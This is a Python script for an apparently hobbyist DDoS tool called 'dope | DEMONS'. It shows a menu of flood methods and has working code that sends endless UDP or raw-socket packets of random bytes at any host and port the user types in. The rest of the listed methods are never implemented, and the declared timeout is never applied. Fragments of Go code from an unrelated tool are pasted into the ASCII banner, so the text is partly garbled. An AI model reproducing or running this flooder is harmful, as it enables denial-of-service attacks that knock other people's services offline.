# -*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import os
sys.stdout.write("\x1b]2;dope| D E M O N S\x07")
os.system ("clear")

help = """\033[91m

++++++++++++++++++++++++++++++++++++++++++++++++++++++++
|               DDoS METHODS                           |
++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ \033[00mUDP  <HOST> <PORT> <SIZE> <TIMEOUT>  \033[91m|\033[00m UDP ATTACK\033[91m    +
+ \033[00mSYN  <HOST> <PORT> <SIZE> <TIMEOUT>  \033[91m|\033[00m SYN ATTACK\033[91m    +
+ \033[00mOVH  <HOST> <PORT> <SIZE> <TIMEOUT>  \033[91m|\033[00m OVH ATTACK\033[91m    +
+ \033[00mHTTP <HOST> <PORT> <SIZE> <TIMEOUT>  \033[91m|\033[00m HTTP ATTACK\033[91m   +
+ \033[00mICMP <HOST> <PORT> <SIZE> <TIMEOUT>  \033[91m|\033[00m ICMP ATTACK\033[91m   +
+ \033[00mRSVP <HOST> <PORT> <SIZE> <TIMEOUT>  \033[91m|\033[00m RSVP ATTACK\033[91m   +
+ \033[00mSCTP <HOST> <PORT> <SIZE> <TIMEOUT>  \033[91m|\033[00m SCTP ATTACK\033[91m   +
+ \033[00mXFRM <HOST> <PORT> <SIZE> <TIMEOUT>  \033[91m|\033[00m XFRM ATTACK\033[91m   +
++++++++++++++++++++++++++++++++++++++++++++++++++++++++
|               BASIC COMMANDS                         |
++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ \033[00mPING <HOST>                   \033[91m|\033[00m RUN A PING\033[91m           +
+ \033[00mMYIP                          \033[91m|\033[00m ECHO THE EXTERNAL IP\033[91m +
+ \033[00mCLEAR                         \033[91m|\033[00m CLEAR SCREEN\033[91m         +
+ \033[00mEXIT                          \033[91m|\033[00m EXIT SINFULL\033[91m         +
+ \033[00mMETHODS                       \033[91m|\033[00m SINS METHODS\033[91m         +
++++++++++++++++++++++++++++++++++++++++++++++++++++++++\033[00m
"""

banner = """
  .---.    \t                            \t\033[37m       .---.    \r\n"))
    this.conn.Write([]byte("\t\033[37m       |---|    \t                            \t\033[37m       |---|    \r\n"))
    this.conn.Write([]byte("\t\033[37m       |---|    \t                            \t\033[37m       |---|    \r\n"))
    this.conn.Write([]byte("\t\033[37m       |---|    \t                            \t\033[37m       |---|    \r\n"))
    this.conn.Write([]byte("\t\033[37m   .---^ - ^---.\t                            \t\033[37m   .---^ - ^---.\r\n"))
    this.conn.Write([]byte("\t\033[37m   :___________:\t                            \t\033[37m   :___________:\r\n"))
    this.conn.Write([]byte("\t\033[37m      |  |//|   \t\033[36m  ██████  ▄▄▄       \033[31m▒\033[36m█████  \t\033[37m      |  |//|   \r\n"))
	this.conn.Write([]byte("\t\033[37m      |  |//|   \t\033[31m▒\033[36m██    \033[31m▒ ▒\033[36m████▄    \033[31m▒\033[36m██\033[31m▒  \033[36m██\033[31m▒\t\033[37m      |  |//|   \r\n"))
	this.conn.Write([]byte("\t\033[37m      |  |//|   \t\033[31m░ ▓\033[36m██▄  \033[31m ▒\033[36m██  ▀█▄  \033[31m▒\033[36m██\033[31m░  \033[36m██\033[31m▒\t\033[37m      |  |//|   \r\n"))
	this.conn.Write([]byte("\t\033[37m      |  |//|   \t\033[31m  ▒\033[36m   ██\033[31m▒░\033[36m██▄▄▄▄██ \033[31m▒\033[36m██   ██\033[31m░\t\033[37m      |  |//|   \r\n"))
	this.conn.Write([]byte("\t\033[37m      |  |//|   \t\033[31m▒\033[36m██████\033[31m▒▒ ▓\033[36m█   \033[31m▓\033[36m██\033[31m▒░ \033[36m████\033[31m▓▒░\t\033[37m      |  |//|   \r\n"))
	this.conn.Write([]byte("\t\033[37m      |  |//|   \t\033[31m▒ ▒▓▒ ▒ ░ ▒▒   ▓▒\033[36m█\033[31m░░ ▒░▒░▒░ \t\033[37m      |  |//|   \r\n"))
	this.conn.Write([]byte("\t\033[37m      |  |.-|   \t\033[31m░ ░▒  ░ ░  ▒   ▒▒ ░  ░ ▒ ▒░ \t\033[37m      |  |.-|   \r\n"))
	this.conn.Write([]byte("\t\033[37m      |.-'**|   \t\033[31m░  ░  ░    ░   ▒   ░ ░ ░ ▒  \t\033[37m      |.-'**|   \r\n"))
	this.conn.Write([]byte("\t\033[37m       \\***/    \t\033[31m      ░        ░  ░    ░ ░  \t\033[37m       \\***/    \r\n"))
	this.conn.Write([]byte("\t\033[37m        \\*/     \t                            \t\033[37m        \\*/     \r\n"))
	this.conn.Write([]byte("\t\033[37m         V      \t                            \t\033[37m         V      \r\n"))
	this.conn.Write([]byte("\t\033[37m        '       \t                            \t\033[37m        '       \r\n"))
	this.conn.Write([]byte("\t\033[37m         ^'     \t                            \t\033[37m         ^'     \r\n"))
	this.conn.Write([]byte("\t\033[37m        (_)     \t                            \t\033[37m        (_)     \r\n"))                 
"""

#def threadsynsender():
#      while True:
#        sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
#        sock.sendto(bytes, (host, port))
print (banner)
#def threadudp():
#  while True:
#    try:
#       sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#       sock.sendto(bytes, (host, port))
#    except KeyboardInterrupt:
#       exit()
def main():
  try:
    mi = raw_input("[dope]-家 ")
    main_input = mi.split(" ")[0]
    if main_input == "help":
     print (help)
     main()
    if main_input == "exit":
     exit()
    if main_input == "UDP":
     try:
       host = mi.split(" ")[1]
       port = int(mi.split(" ")[2])
       ps = int(mi.split(" ")[3])
       time_out = float(mi.split(" ")[4])
       bytes = random._urandom(ps)
       timeout = time.time() + time_out
       #print ("Sending UDP Requests to :\033[91m {}\033[00m".format (host))
#       threading.Thread(target=threadudp).start()
       while True:
         try:
           sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
           sock.sendto(bytes, (host, port))
         except KeyboardInterrupt:
           print ("CTRL-C PRESSED ACTION: EXIT")
           main()
     except IndexError:
       #print ("The command: {} Requires an argument".format (main_input))
       main()
    if main_input == "SYN":
     try:
       host = mi.split(" ")[1]
       port = int(mi.split(" ")[2])
       packet_size = int(mi.split(" ")[3])
       time_out = float(mi.split(" ")[4])
       bytes = random._urandom(packet_size)
       timeout = time.time() + time_out
       sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
#      threading.Thread(target=threadsynsender).start()
       #print ("SYN ATTACK STARTED ON HOST:\033[91m {}\033[00m".format(host))
       while True:
        try:
          sock.sendto(bytes, (host, port))
        except KeyboardInterrupt:
          print ("CTRL-C PRESSED ACTION: EXIT")
          exit()
     except IndexError:
       #print ("The command: {} Requires an argument".format(main_input))
       main()
    else:
     #print ("Command: {} not found".format(main_input))
     main()
  except KeyboardInterrupt:
    print ("\nReleasing the demons")
    exit()
main()

